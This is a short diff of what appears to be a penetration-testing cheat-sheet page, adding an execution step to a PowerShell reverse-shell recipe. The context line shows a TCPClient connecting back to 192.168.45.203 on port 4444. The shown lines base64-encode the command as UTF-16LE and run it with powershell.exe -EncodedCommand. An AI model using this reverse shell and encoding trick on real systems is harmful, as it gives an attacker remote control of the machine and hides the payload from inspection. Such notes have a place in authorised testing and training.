@@ -225,6 +225,9 @@ $client = New-Object System.Net.Sockets.TCPClient('192.168.45.203',4444);$stream
 
 [encoded]
 $ iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n"
+
+[execute]
+powershell.exe -EncodedCommand {encoded-payload}
 </code></pre></div></div>
 
 <!-- END -->
